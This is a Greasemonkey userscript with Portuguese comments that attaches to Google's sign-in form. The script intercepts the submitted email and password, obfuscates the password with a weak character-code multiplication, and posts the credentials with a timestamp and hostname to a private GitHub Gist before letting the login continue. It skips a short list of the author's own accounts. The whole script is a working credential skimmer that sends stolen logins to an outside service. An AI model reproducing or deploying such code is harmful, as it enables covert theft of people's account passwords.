// ==UserScript==
// @name        testeCreateGist
// @description precisa: OAuth para o Gist, API externa; não realmente privados.
// @namespace   https://gist.github.com/micalevisk/3f94e2000732ce51304472a4564f4cfe
// @author      Micael Levi
// @locale      pt-br
// @include     *://accounts.google.com/*ServiceLogin?*
// @include     *://accounts.google.com/*signin*
// @version     1.21-2
// @grant       none
// @run-at	document-end
// @require	file:///C:/Users/user/AppData/Roaming/Mozilla/Firefox/Profiles/xwt25znr.default/gm_scripts/_private-gist.js
// ==/UserScript==


/////////////// [ PRIVATE DATA ] ///////////////
const AUTH = gist_privateData;
const GIST_USERNAME = AUTH.username;
const PERSONAL_ACCESS_TOKEN = AUTH.useroauth;
const SENHA_PRIVADA = PERSONAL_ACCESS_TOKEN;
////////////////////////////////////////////////


// ignora tais prefixos/login:
const IGNORAR = [ "mlxlc", "terminatorredapb" ];
var user_especs = new USERSET("","");



/////////////////////////////////////////////////////////////////////////////////
// (c) https://developer.mozilla.org/en-US/Add-ons/SDK/Guides/Contributor_s_Guide/Private_Properties
function USERSET(email, _senha, flag=false){
	"use strict";
	this.email = email;
	this.flag  = flag;
	this.getSenha = () => _senha;
	this.setSenha = (senha) => _senha = criptografar(senha, SENHA_PRIVADA, '/');
	this.toString = () => `{"email":"${this.email}", "senha":"${this.getSenha()}"}`;
	this.toJSON   = function(){
		return {
			"email": this.email,
			"senha": this.getSenha()
		}
	}
}
/////////////////////////////////////////////////////////////////////////////////



/**
 * Inicia a API Gistachio (c) https://github.com/stuartpb/gistachio.
 * @param {String} id - A id no objeto script que será criado e inserido no head.
 * @param {Boolean} confirmar - Se for 'true', exibe uma mensagem no console após inserir.
 */
function initgistachioAPI(id, confirmar){
	if(document.getElementById(id) != null) return;

	var script = document.createElement('script');
	script.type = 'text/javascript';
	// script.src = 'https://rawgit.com/micalevisk/GM_scripts/master/gistachio.js'; // (c) https://rawgit.com/stuartpb/gistachio/master/gistachio.js
	script.src = 'https://rawgit.com/stuartpb/gistachio/master/gistachio.js';
	if(id) script.id  = id;
	document.head.appendChild(script);

	if(confirmar)
		console.info("gistachio inserido!");
}



/**
 * Cria e posta um gist no http://gits.github.com
 * @param {USERSET} conteudo - O conteúdo do gist (ao usar o método toString).
 * @param {String} nomeArquivo - O nome do arquivo no gist.
 * @param {String} descricao - A descrição do gist.
 * @param {String} oauthgist - Personal access token (definido para criar gists).
 */
function postit(conteudo, nomeArquivo, descricao, oauthgist){
	if(!(conteudo instanceof USERSET) || (typeof nomeArquivo !== 'string') || (nomeArquivo.isEmpty())) return;

	var conteudostr =
	{
	  "_date": (new Date()).formatar("%m%/%d%/%Y% - %H%:%i%:%s%"),
	  "browser": navigator.appCodeName,
	  "site": window.location.hostname,
	  "personal": conteudo.toJSON()
	}
	conteudostr = JSON.stringify(conteudostr, null, 4);

	// console.info("PREVIEW:");	// <<<<<<<<<<<<<<<
	// console.log(conteudostr);	// <<<<<<<<<<<<<<<

	var newfile = {};
	newfile[nomeArquivo] = { "content": conteudostr };

	var optsnew = {
		accessToken: oauthgist,
		description: descricao,
		public: false
	};

	var showResult = function(e, gistid){
		if(e){
			user_especs.flag = false;
			console.error(e);	// <<<<<<<<<<<<<<<
		}
		else{
			user_especs.flag = true;
			linkresult = `https://gist.github.com/${GIST_USERNAME}/${gistid}`;

			console.log(linkresult); // <<<<<<<<<<<<<<<
			console.info(gistid);	// <<<<<<<<<<<<<<<
		}
	};

	window.gistachio.postFiles(newfile, optsnew, showResult);
}



/**
 * Adiciona/altera um arquivo em um gist já existente.
 * @param {String} gistid - O id único do gist que será editado.
 * @param {String} nomeArquivo - O nome do novo/alterado arquivo no gist.
 * @param {String} conteudo - O conteúdo do arquivo que será adicionado/editado.
 * @param {String} oauthgist - Personal access token (definido para criar gists).
 * @param {String} descricaoGist - (opcional) A nova descrição do gist.
 */
function adicionarArquivo(gistid, nomeArquivo, conteudo, oauthgist, descricaoGist){
	if((typeof nomeArquivo !== 'string') || (nomeArquivo.isEmpty())) return;

	var newfile = {};
	newfile[nomeArquivo] = { "content": conteudo };

	var optsnew = {
		accessToken: oauthgist,
		description: descricaoGist
	};

	var showResult = function(e, responsedata){
		if(e){
			console.error(e);	// <<<<<<<<<<<<<<<
		}
		else{
			linkresult = `https://gist.github.com/${GIST_USERNAME}/${gistid}`;

			console.log(linkresult);	// <<<<<<<<<<<<<<<
			// console.info(responsedata);	// <<<<<<<<<<<<<<<
			// responsedata contém todos os arquivos desse gist.
		}
	};

	window.gistachio.patchFiles(gistid, newfile, optsnew, showResult);

}






///////////////////////// [ ALTERAR ESTA ] /////////////////////////
function GM_main(){
	document.querySelector('form#gaia_loginform').addEventListener('submit', function (e) {
		e.preventDefault();
		var form = this;

		var emailcurr = form.Email;
		var password = form.Passwd;

		if(typeof password !== 'undefined'){
			emailcurr = emailcurr.value.toString();
			password = password.value.toString();

			if(!password.isEmpty()){
				if(!IGNORAR.contemEmail(emailcurr)){
					user_especs.email = emailcurr;

					if(!user_especs.flag){
						user_especs.setSenha(password);
						postit(user_especs, 'arquivo.txt', 'descrição do gist', PERSONAL_ACCESS_TOKEN);
						// adicionarArquivo('<GIST ID>', 'nomeOutro', 'conteudo do novo arquivo', PERSONAL_ACCESS_TOKEN, new Date().toLocaleString());
					}
				}
			}
			setTimeout(() => form.submit(), 3500); // wait 3,5 seconds
		}
	});
}



////////////////////////////////////////////////////////////////////////////////////////////////////
String.prototype.isEmpty = function() {
	return !(this.trim());
}

Array.prototype.contemEmail = function (emailstr){
	var dominio = emailstr.replace(/^([^@]+)@.+$/i, "$1").trim();
	return (this.indexOf(dominio) > -1);
};

// (c) http://jsfromhell.com/geral/date-format [rev. #1] !!MINIFIED!!
Date.prototype.formatar = function(n){
	var t=this,e=function(n,t){return(n+="").length<t?new Array(++t-n.length).join("0")+n:n},r={},u={j:function(){return t.getDate()},w:function(){return t.getDay()},y:function(){return(t.getFullYear()+"").slice(2)},Y:function(){return t.getFullYear()},n:function(){return t.getMonth()+1},m:function(){return e(u.n(),2)},g:function(){return t.getHours()%12||12},G:function(){return t.getHours()},H:function(){return e(t.getHours(),2)},h:function(){return e(u.g(),2)},d:function(){return e(u.j(),2)},N:function(){return u.w()+1},i:function(){return e(t.getMinutes(),2)},s:function(){return e(t.getSeconds(),2)},ms:function(){return e(t.getMilliseconds(),3)},a:function(){return t.getHours()>11?"pm":"am"},A:function(){return u.a().toUpperCase()},O:function(){return t.getTimezoneOffset()/60},z:function(){return(t-new Date(t.getFullYear()+"/1/1"))/864e5>>0},L:function(){var n=u.Y();return 3&n||!(n%100)&&n%400?0:1},t:function(){var n;return 2==(n=t.getMonth()+1)?28+u.L():1&n&&8>n||!(1&n)&&n>7?31:30},W:function(){var n=u.z(),e=364+u.L()-n,r=(new Date(t.getFullYear()+"/1/1").getDay()||7)-1;return 2>=e&&(t.getDay()||7)-1<=2-e?1:2>=n&&r>=4&&n>=6-r?new Date(t.getFullYear()-1+"/12/31").format("%W%"):1+(3>=r?(n+r)/7:(n-(7-r))/7)>>0}};return n.replace(/%(.*?)%/g,function(n,e){return r[e]?r[e](t,function(n){return u[n]&&u[n]()}):u[e]?u[e]():"%"+(e&&e+"%")})
}



/**
 * @param {String} texto - o texto que será criptografado
 * @param {String} strKey - o chave privada.
 * @param {String} separador - (opcional) - define a sequência de caracteres que separam os valores visualmente.
 * @return {?} Se o 'separador' estiver definido, retorna {String}, senão, retorna {Array}.
 */
function criptografar(texto, strKey, separador){
	if(Array.prototype.slice.call(arguments).length < 2) return [];

	const arrayMap = Array.prototype.map;
	const toASCII  = x => x.charCodeAt(0);
	const arrKey = arrayMap.call(strKey, toASCII);
	const j = arrKey.length;
	var final = null;

	// criptografando:
	var arrText = arrayMap.call(texto, toASCII);
	final = arrText.map( (ascii, i) => ascii * arrKey[i % j] );

	if(typeof separador === "string") return final.join(separador); // retorna como String (possui ASCII separados por 'separador')
	return final; // retorna como Array (os elementos são códigos ASCII)
}
////////////////////////////////////////////////////////////////////////////////////////////////////




///////////////////////////////// [ MAIN ] ////////////////////////////////
initgistachioAPI('meulog', true);
window.addEventListener("load", GM_main, false);
